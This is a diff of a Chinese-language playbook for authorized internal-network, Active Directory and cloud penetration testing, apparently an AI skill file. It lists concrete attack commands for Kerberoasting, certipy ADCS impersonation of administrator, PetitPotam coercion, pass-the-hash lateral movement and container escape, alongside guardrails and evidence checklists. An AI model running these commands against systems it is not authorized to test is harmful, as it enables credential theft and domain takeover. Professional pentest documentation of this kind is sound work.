@@ -25,11 +25,9 @@ description: 【内网/AD/云原生】用于授权范围内的内网渗透、Act
 至少确认：域名 / NetBIOS 名、DC 主机名与 IP、DNS、当前账号与权限、已控主机列表、时间同步状态。
 
 ```bash
-# Linux 侧
 nxc smb <DC_IP> -u <user> -p <pass> -d <domain>          # netexec，原 crackmapexec
 ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<pass>' -b 'dc=<domain>,dc=com'
-# Windows 侧
-whoami /all & echo %USERDNSDOMAIN% & nltest /dsgetdc:<domain>
+whoami /all & echo %USERDNSDOMAIN% & nltest /dsgetdc:<domain>   # Windows 侧
 ```
 
 没有域信息时先做只读探测：`nxc smb <网段> -u '' -p ''`、DNS SRV 查询、`nmap -p88,389,445,5985`。**不要**在信息不足时直接开扫全端口或跑重型利用。
@@ -60,8 +58,7 @@ whoami /all & echo %USERDNSDOMAIN% & nltest /dsgetdc:<domain>
 ### 1. 枚举与 BloodHound
 
 ```bash
-# 采集（Linux，需有效域凭据）
-bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip
+bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip   # Linux，需域凭据
 # Windows 侧可用 SharpHound.exe -c All --zipfilename bh.zip
 ```
 
@@ -72,8 +69,7 @@ bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip
 ```bash
 impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.hash
 impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.hash
-hashcat -m 13100 kerb.hash wordlist.txt     # Kerberoast
-hashcat -m 18200 asrep.hash wordlist.txt    # AS-REP
+hashcat -m 13100 kerb.hash wordlist.txt    # Kerberoast；AS-REP 用 -m 18200 asrep.hash
 ```
 
 判据：拿到可被离线破解的 hash，且破解出明文或可被 PtH/PKINIT 复用。只拿到 hash 未破解，算"素材"不算"证据"。
@@ -83,7 +79,7 @@ hashcat -m 18200 asrep.hash wordlist.txt    # AS-REP
 ```bash
 certipy find -u <user>@<domain> -p '<pass>' -dc-ip <DC_IP> -vulnerable -stdout
 certipy req -u <user>@<domain> -p '<pass>' -ca <CA> -template <Tpl> -upn administrator@<domain> -dc-ip <DC_IP>
-certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>   # 拿到 TGT/ccache 才算成功
 ```
 
 ESC1（模板允许任意 SAN + 低权注册）、ESC2（Any Purpose）、ESC3（注册代理）、ESC4（模板 ACL 可写）、ESC5（PKI 对象 ACL）、ESC6（编辑 flag）、ESC7（CA 权限）、ESC8（HTTP 端点 NTLM relay）。详细区分与利用见 reference。
@@ -112,8 +108,7 @@ petitpotam.py <listener_ip> <target_ip>
 nxc smb <target> -u <user> -H <ntlm> -d <domain> --shares
 nxc wmi <target> -u <user> -H <ntlm> -d <domain> -x 'whoami'
 nxc winrm <target> -u <user> -H <ntlm> -d <domain> -x 'whoami'
-impacket-psexec <domain>/<user>@<target> -hashes :<ntlm>
-impacket-wmiexec <domain>/<user>@<target> -hashes :<ntlm>
+impacket-psexec|wmiexec <domain>/<user>@<target> -hashes :<ntlm>   # 最吵，最后用
 ```
 
 优先级：WinRM（5985/5986）> WMI > SMB > psexec（最吵，最后用）。每次成功后立即记录主机、账号、权限级别与时间。
@@ -124,10 +119,8 @@ impacket-wmiexec <domain>/<user>@<target> -hashes :<ntlm>
 
 ```bash
 aws sts get-caller-identity
-aws iam list-attached-user-policies --user-name <user>
-aws iam list-user-policies --user-name <user>
-# 只读快查：枚举可访问的资源
-aws s3 ls; aws ec2 describe-instances --max-items 5
+aws iam list-attached-user-policies --user-name <user>; aws iam list-user-policies --user-name <user>
+aws s3 ls; aws ec2 describe-instances --max-items 5   # 只读快查可访问资源
 ```
 
 先判定身份与权限面，再决定是提权、横向到其他账号，还是拿数据证据。**不要**直接批量导出对象存储。
@@ -153,8 +146,7 @@ kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>
 
 ### 4. 容器逃逸
 
-- privileged + `CAP_SYS_ADMIN`：挂宿主 `/` 或 `nsenter`
-- `hostPath` 挂载 `/var/run/docker.sock` / `/run/containerd/containerd.sock`：起特权容器
+- privileged + `CAP_SYS_ADMIN`：挂宿主 `/` 或 `nsenter`；`hostPath` 挂 `/var/run/docker.sock`、`/run/containerd/containerd.sock`：起特权容器
 - `hostPID` + `nsenter -t 1 -m -u -i -n -p`；内核漏洞 / cgroup release_agent / `CAP_SYS_PTRACE` 注入宿主进程
 
 判据：在宿主命名空间执行 `id` 或读到宿主文件系统，且能给出复现命令。
@@ -206,9 +198,8 @@ kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>
 3. **时钟偏移**：Kerberos 默认容忍 5 分钟。容器/跳板机时间漂移会导致 `KRB_AP_ERR_SKEW`，先 `chronyc tracking` / `w32tm /stripchart` 对齐再申请票据。
 4. **云审计日志**：CloudTrail / GuardDuty / Azure Activity Log / K8s audit 会记录 `GetSecretValue`、`AssumeRole`、`create pods`、`exec`。优先用只读 API、避免批量列举；所有调用记录时间以便与告警对齐。
 5. **票据/令牌过期**：TGT 默认 10 小时、云临时凭据通常 1 小时、SA token 可能绑定 Pod 生命周期。拿到就记录到期时间，别在报告里把过期凭据当有效证据。
-6. **NTLM relay 失败**：多半是 SMB/LDAP signing 或 EPA 已启用，或目标强制 SMBv3 加密。先验证再投入时间。
-7. **ADCS 误判**：`certipy find` 报 vulnerable 不等于可利用，要确认当前账号对模板有 Enroll 权限、CA 允许 SAN、且没有 manager approval。
-8. **容器逃逸后误伤**：挂宿主根目录只读优先；`nsenter` 前确认 PID 命名空间；不要在宿主上装工具或改配置。
+6. **NTLM relay / ADCS 误判**：relay 失败多半是 SMB/LDAP signing 或 EPA 已开、强制 SMBv3 加密；`certipy find` 报 vulnerable 不等于可利用，要确认当前账号对模板有 Enroll、CA 允许 SAN、无 manager approval。先验证再投入。
+7. **容器逃逸后误伤**：挂宿主根目录只读优先；`nsenter` 前确认 PID 命名空间；不要在宿主上装工具或改配置。
 
 ## 验收
 
@@ -216,10 +207,8 @@ kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>
 - [ ] 每条结论都有"命令 + 输出 + 时间 + 源/目标"
 - [ ] 凭据类证据给出获取路径与可复现步骤，敏感值做脱敏/指纹化
 - [ ] 提权类证据给出前后对比（权限、组成员、`auth can-i` 结果）
-- [ ] 明确标注失败路径与失败原因（如 signing 已开、模板需审批）
-- [ ] 未在目标上遗留持久化、计划任务、后门账号（除非单独授权）
-- [ ] 风险与修复建议分开写，不把"能打穿"直接等同于"必须立刻修"
-- [ ] `json`/脚本类产物做过语法校验，路径与仓库约定一致
+- [ ] 明确标注失败路径与失败原因（如 signing 已开、模板需审批）；未在目标遗留持久化/计划任务/后门账号（除非单独授权）
+- [ ] 风险与修复建议分开写，不把"能打穿"直接等同于"必须立刻修"；`json`/脚本类产物做过语法校验，路径与仓库约定一致
 
 ## 边界
 
